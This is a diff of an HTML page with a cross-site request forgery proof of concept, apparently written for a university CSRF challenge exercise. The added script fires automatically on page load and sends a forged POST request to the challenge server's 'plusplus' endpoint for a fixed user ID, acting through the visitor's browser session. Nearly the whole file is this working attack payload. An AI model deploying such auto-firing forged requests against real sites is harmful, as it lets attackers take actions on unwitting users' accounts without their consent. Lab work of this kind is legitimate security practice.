@@ -1,19 +1,28 @@
 <html>
   <head>
     <script>
-      try {
-          const response = await fetch("https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus?userId=6911a3025201a4c297de8ddb9c475226c0fb6230", {
-          method: "POST"
-          });
+      async function csrf2() {
+        try {
+          const response = await fetch(
+            "https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus?userId=6911a3025201a4c297de8ddb9c475226c0fb6230",
+            {
+              method: "POST",
+            }
+          );
 
-        if (response.ok) {
+          if (response.ok) {
             console.log("ok");
-        } else {
-          console.log("not ok");
+          } else {
+            console.log("not ok");
+          }
+        } catch (e) {
+          console.error("error: ", e);
         }
-      } catch (e) {
-        console.error("error: ", e);
       }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        csrf2();
+      });
     </script>
   </head>
   <body>
